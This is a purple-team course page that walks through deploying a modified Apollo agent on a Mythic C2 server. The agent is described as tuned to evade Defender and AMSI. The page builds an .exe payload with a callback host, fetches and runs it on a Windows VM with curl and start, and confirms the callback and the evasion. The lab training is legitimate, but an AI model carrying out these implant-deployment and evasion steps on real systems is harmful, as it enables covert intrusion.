---
layout: default
title: "Moving Tuned Apollo Agent to Mythic Server"
permalink: /solo-purple-teaming/moving-tuned-apollo-agent-to-mythic-server/
---
<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Moving Tuned Apollo Agent to Mythic Server</h1>
</section>
<section class="spt-content">
<p>Owner: Mike Sterrett</p>
<h3 id="dart-objective">🎯 Objective</h3>
<p>Move your modified Apollo agent code (tuned to bypass Defender and
AMSI) from your Windows 11 reverse engineering VM to the Kali box
hosting Mythic, and verify that the payload builds and functions
correctly.</p>
<hr />
<h3 id="bricks-prerequisites">🧱 Prerequisites</h3>
<ul>
<li>Mythic installed and running on a Kali box</li>
<li>A working, modified Apollo agent on your Windows machine</li>
<li>SSH/SCP access from Windows to Kali</li>
<li>Python3 installed for HTTP serving</li>
</ul>
<hr />
<h2 id="step-1-clean-up-windows-workspace">Step 1: Clean Up Windows
Workspace</h2>
<ol type="1">
<li>Navigate to your Windows desktop and remove any non-research
files.</li>
<li>Empty your trash to avoid clutter outside your research
directory.</li>
</ol>
<hr />
<h2 id="step-2-prepare-modified-agent-code">Step 2: Prepare Modified
Agent Code</h2>
<ol type="1">
<li><p>Navigate to the modified agent directory:</p>
<pre><code>C:\...\research\Apollo-Master\Apollo-Master\Payload_Types\Apollo\Apollo\Agent_Code
</code></pre></li>
<li><p>Copy the <strong>Agent_Code</strong> folder to your top-level
<code>research</code> folder.</p></li>
</ol>
<p><img
src="Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image.png"
alt="image.png" /></p>
<ol type="1">
<li><p>Compress the copied folder:</p>
<ul>
<li>Right-click → “Compress to ZIP file”</li>
</ul>
<p><img
src="Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%201.png"
alt="image.png" /></p>
<ul>
<li>Name it: <code>agent_code.zip</code></li>
</ul></li>
</ol>
<hr />
<h2 id="step-3-transfer-code-to-kali-with-scp">Step 3: Transfer Code to
Kali with SCP</h2>
<ol type="1">
<li><p>Open a terminal (on your Windows machine).</p></li>
<li><p>Use SCP to transfer the ZIP file to your Kali box:</p>
<div class="sourceCode" id="cb2"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="fu">bash</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="fu">scp</span> agent_code.zip username@10.0.3.2:~/</span></code></pre></div></li>
</ol>
<p><img
src="Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%202.png"
alt="image.png" /></p>
<ol type="1">
<li>Authenticate if prompted.</li>
</ol>
<hr />
<h2 id="step-4-replace-apollo-agent-code-in-mythic">Step 4: Replace
Apollo Agent Code in Mythic</h2>
<ol type="1">
<li><p>SSH into your Kali box:</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> username@10.0.3.2</span></code></pre></div></li>
<li><p>Move the ZIP file to the Apollo agent directory:</p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> mv ~/agent_code.zip /opt/mythic/mythic/installed_services/Apollo/Apollo/</span></code></pre></div></li>
<li><p>Navigate to the directory:</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/mythic/mythic/installed_services/Apollo/Apollo/</span></code></pre></div></li>
<li><p>Remove the old agent code:</p>
<div class="sourceCode" id="cb6"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> rm <span class="at">-rf</span> agent_code</span></code></pre></div></li>
<li><p>Unzip the new agent code:</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> unzip agent_code.zip</span></code></pre></div></li>
<li><p>Set permissions:</p>
<div class="sourceCode" id="cb8"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> chmod <span class="at">-R</span> 755 agent_code</span></code></pre></div></li>
</ol>
<hr />
<h2 id="step-5-add-the-execute-method-for-reflective-loading">Step 5:
Add the <code>Execute</code> Method for Reflective Loading</h2>
<ol type="1">
<li><p>Navigate to <code>Program.cs</code> inside the new agent
code:</p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> agent_code/Apollo/</span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> vi Program.cs</span></code></pre></div></li>
<li><p>Add the following method before the <code>Main</code> method:</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode csharp"><code class="sourceCode cs"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">static</span> <span class="dt">void</span> <span class="fu">Execute</span><span class="op">()</span></span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">string</span><span class="op">[]</span> args <span class="op">=</span> <span class="op">{};</span></span>
<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>    <span class="fu">Main</span><span class="op">(</span>args<span class="op">);</span></span>
<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div></li>
</ol>
<p><img
src="Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%203.png"
alt="image.png" /></p>
<ol type="1">
<li>Save and exit (<code>ESC</code> → <code>:wq</code>)</li>
</ol>
<hr />
<h2 id="step-6-restart-mythic">Step 6: Restart Mythic</h2>
<ol type="1">
<li><p>Go to Mythic root:</p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/mythic/mythic</span></code></pre></div></li>
<li><p>Restart the Mythic server:</p>
<div class="sourceCode" id="cb12"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> ./mythic-cli stop</span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> ./mythic-cli start</span></code></pre></div></li>
</ol>
<hr />
<h2 id="step-7-build-a-new-payload-in-mythic">Step 7: Build a New
Payload in Mythic</h2>
<ol type="1">
<li>In your browser, go to <code>https://localhost:7443</code> and log
in to Mythic.</li>
<li>Delete the old payload from the UI if present.</li>
</ol>
<p><img
src="Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%204.png"
alt="image.png" /></p>
<ol type="1">
<li>Click <strong>Actions → Generate New Payload</strong></li>
<li>Select:
<ul>
<li><strong>Payload Type:</strong> Apollo</li>
<li><strong>Format:</strong> Windows → <code>.exe</code></li>
<li><strong>Listener:</strong> HTTP</li>
<li><strong>Callback Host:</strong> <code>10.0.3.2</code></li>
</ul></li>
<li>Name it something like <code>Apollo_custom.exe</code></li>
<li>Click <strong>Create Payload</strong></li>
<li>Confirm successful build (no errors). Download the payload.</li>
</ol>
<hr />
<h2 id="step-8-host-the-payload-with-python">Step 8: Host the Payload
with Python</h2>
<ol type="1">
<li><p>Transfer the payload to your Kali box:</p>
<div class="sourceCode" id="cb13"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="fu">scp</span> Apollo_custom.exe username@192.168.x.x:~/Downloads</span></code></pre></div></li>
<li><p>SSH into Kali and serve the payload:</p>
<div class="sourceCode" id="cb14"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> username@192.168.x.x</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> Downloads</span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-m</span> http.server 8000</span></code></pre></div></li>
</ol>
<hr />
<h2 id="step-9-execute-the-payload-on-windows">Step 9: Execute the
Payload on Windows</h2>
<ol type="1">
<li><p>On your Windows 11 VM, open a terminal.</p></li>
<li><p>Download and run the payload:</p>
<div class="sourceCode" id="cb15"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> http://192.168.x.x:8000/Apollo_custom.exe <span class="at">-o</span> Apollo.exe</span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="ex">start</span> Apollo.exe</span></code></pre></div></li>
</ol>
<hr />
<h2 id="step-10-verify-callback-and-interaction">Step 10: Verify
Callback and Interaction</h2>
<ol type="1">
<li><p>In Mythic, check the <strong>Callbacks</strong> tab for a new
agent.</p></li>
<li><p>Click the callback to interact with the agent.</p></li>
<li><p>Test basic commands:</p>
<ul>
<li><p>Load the module:</p>
<pre><code>load whoami
</code></pre></li>
</ul>
<p><img
src="Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%205.png"
alt="image.png" /></p>
<ul>
<li><p>Run:</p>
<pre><code>whoami
</code></pre></li>
</ul>
<p><img
src="Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%206.png"
alt="image.png" /></p>
<p>Output should confirm you're operating under your Windows user
context (e.g., <code>reverseengineer</code>).</p>
<p><img
src="Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%207.png"
alt="image.png" /></p></li>
</ol>
<hr />
<h2 id="step-11-confirm-defender-and-amsi-bypass">Step 11: Confirm
Defender and AMSI Bypass</h2>
<ol type="1">
<li>On the Windows VM:
<ul>
<li>Go to <strong>Windows Security → Virus &amp; threat
protection</strong></li>
<li>Ensure <strong>Real-time protection</strong> is
<strong>ON</strong></li>
</ul></li>
<li>Confirm that the payload executed and communicated without
triggering Defender.</li>
</ol>
<hr />
<h2 id="white_check_mark-final-checkpoint">✅ Final Checkpoint</h2>
<p>Before moving on:</p>
<ul>
<li>✅ You must have a <strong>working Apollo payload</strong> that
bypasses both <strong>Defender</strong> and <strong>AMSI</strong></li>
<li>❌ If it's still flagged or fails to run — <strong>do not
proceed</strong></li>
<li>🛠️ Troubleshoot until your agent works as expected</li>
</ul>
<hr />
<h2 id="dart-challenge">🎯 Challenge</h2>
<p>This step is <strong>mandatory</strong> for continuing the course. No
fixes will be provided — solving this is part of your hands-on
experience.</p>
</section>
</div>
